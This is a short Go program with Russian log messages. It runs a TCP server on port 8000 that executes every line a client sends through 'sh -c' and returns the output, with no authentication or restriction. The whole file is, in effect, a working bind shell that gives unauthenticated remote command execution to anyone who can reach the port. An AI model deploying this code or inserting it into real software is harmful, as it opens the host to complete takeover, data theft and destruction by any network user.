package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
)

func main() {
	listener, err := net.Listen("tcp", ":8000")
	if err != nil {
		log.Fatal("Ошибка запуска сервера:", err)
	}
	defer listener.Close()

	fmt.Println("Сервер слушает на порту 8000...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Ошибка принятия соединения:", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			log.Println("Ошибка чтения команды:", err)
			return
		}

		command = strings.TrimSpace(command)

		if command == "exit" {
			fmt.Fprintln(conn, "Закрытие соединения...")
			break
		}

		output, err := exec.Command("sh", "-c", command).CombinedOutput()
		if err != nil {
			fmt.Fprintln(conn, "Ошибка выполнения команды:", err)
			continue
		}

		fmt.Fprintln(conn, string(output))
	}
}
